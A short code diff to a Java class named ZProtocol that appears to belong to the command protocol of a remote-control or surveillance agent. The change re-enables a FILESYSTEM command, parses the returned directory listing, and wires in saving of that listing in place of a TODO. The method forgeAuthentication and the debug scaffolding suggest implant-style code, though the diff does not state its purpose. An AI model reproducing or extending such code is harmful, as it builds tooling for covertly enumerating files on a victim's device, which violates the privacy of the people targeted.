@@ -98,8 +98,8 @@ public class ZProtocol extends Protocol {
             //#ifdef DEBUG
             debug.info("***** FileSystem *****");
             //#endif  
-            //response = command(Proto.FILESYSTEM);
-            //parseFileSystem(response);
+            response = command(Proto.FILESYSTEM);
+            parseFileSystem(response);
 
             //#ifdef DEBUG
             debug.info("***** Log *****");
@@ -137,7 +137,6 @@ public class ZProtocol extends Protocol {
     }
 
     ////************************** PROTOCOL *************************************** ////
-
     protected byte[] forgeAuthentication() {
         Keys keys = Keys.getInstance();
 
@@ -385,6 +384,7 @@ public class ZProtocol extends Protocol {
             DataBuffer dataBuffer = new DataBuffer(result, 4,
                     result.length - 4, false);
             try {
+                int totSize = dataBuffer.readInt(); 
                 int left = dataBuffer.readInt();
                 //#ifdef DEBUG
                 debug.trace("parseUpload left: " + left);
@@ -440,6 +440,7 @@ public class ZProtocol extends Protocol {
             DataBuffer dataBuffer = new DataBuffer(result, 4,
                     result.length - 4, false);
             try {
+                int totSize = dataBuffer.readInt(); 
                 int numElem = dataBuffer.readInt();
                 for (int i = 0; i < numElem; i++) {
                     int depth = dataBuffer.readInt();
@@ -452,8 +453,7 @@ public class ZProtocol extends Protocol {
 
                     // expanding $dir$
                     file = Directory.expandMacro(file);
-                    // TODO
-                    //Protocol.saveFilesystem(file);
+                    Protocol.saveFilesystem(depth, file);
                 }
 
             } catch (EOFException e) {
